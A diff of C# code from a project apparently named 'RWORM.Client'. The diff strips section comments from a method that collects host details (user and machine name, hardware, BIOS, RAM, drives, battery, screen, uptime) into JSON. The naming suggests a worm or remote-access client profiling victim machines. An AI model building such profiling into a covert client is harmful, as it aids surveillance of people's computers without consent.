@@ -54,7 +54,7 @@ namespace RWORM.Client.Modules
         {
             var sb = new StringBuilder("{");
 
-            // 1. Basic Identity
+            
             sb.Append($"\"machine_name\":\"{JsonHelper.Escape(Environment.MachineName)}\",");
             sb.Append($"\"hostname\":\"{JsonHelper.Escape(Environment.MachineName)}\",");
             sb.Append($"\"user_name\":\"{JsonHelper.Escape(Environment.UserName)}\",");
@@ -68,7 +68,7 @@ namespace RWORM.Client.Modules
             sb.Append($"\"processor_count\":{Environment.ProcessorCount},");
             sb.Append($"\"processorCount\":{Environment.ProcessorCount},");
 
-            // 2. Battery & Power & Device Type
+            
             string deviceType = "Desktop PC";
             int batteryPercent = -1;
             string batteryStatus = "No Battery";
@@ -77,7 +77,7 @@ namespace RWORM.Client.Modules
 
             if (GetSystemPowerStatus(out SYSTEM_POWER_STATUS status))
             {
-                // BatteryFlag: 128 = No system battery, 255 = Unknown status
+                
                 if (status.BatteryFlag != 128 && status.BatteryFlag != 255 && status.BatteryFlag != 0)
                 {
                     hasBattery = true;
@@ -108,7 +108,7 @@ namespace RWORM.Client.Modules
                 };
             }
 
-            // Fallback device type detection via chassis/system type if power status didn't confirm laptop
+            
             if (!hasBattery)
             {
                 deviceType = DetectChassisDeviceType();
@@ -124,7 +124,7 @@ namespace RWORM.Client.Modules
             sb.Append($"\"chargingStatus\":\"{JsonHelper.Escape(batteryStatus)}\",");
             sb.Append($"\"power_line\":\"{JsonHelper.Escape(powerLine)}\",");
 
-            // 3. Hardware (CPU, BIOS, Motherboard)
+            
             string cpuName = "Unknown CPU";
             string cpuIdentifier = "";
             try
@@ -163,7 +163,7 @@ namespace RWORM.Client.Modules
             sb.Append($"\"bios_date\":\"{JsonHelper.Escape(biosDate)}\",");
             sb.Append($"\"biosDate\":\"{JsonHelper.Escape(biosDate)}\",");
 
-            // 4. Physical RAM (Accurate via GlobalMemoryStatusEx)
+            
             long totalRamMb = 0;
             try
             {
@@ -184,7 +184,7 @@ namespace RWORM.Client.Modules
             sb.Append($"\"total_ram_mb\":{totalRamMb},");
             sb.Append($"\"totalRamMb\":{totalRamMb},");
 
-            // 5. Drives
+            
             var drivesSb = new StringBuilder("[");
             bool firstDrive = true;
             try
@@ -211,7 +211,7 @@ namespace RWORM.Client.Modules
             drivesSb.Append(']');
             sb.Append($"\"drives\":{drivesSb},");
 
-            // 6. Screen & Uptime
+            
             int screenWidth = GetSystemMetrics(SM_CXSCREEN);
             int screenHeight = GetSystemMetrics(SM_CYSCREEN);
             ulong uptimeMs = GetTickCount64();
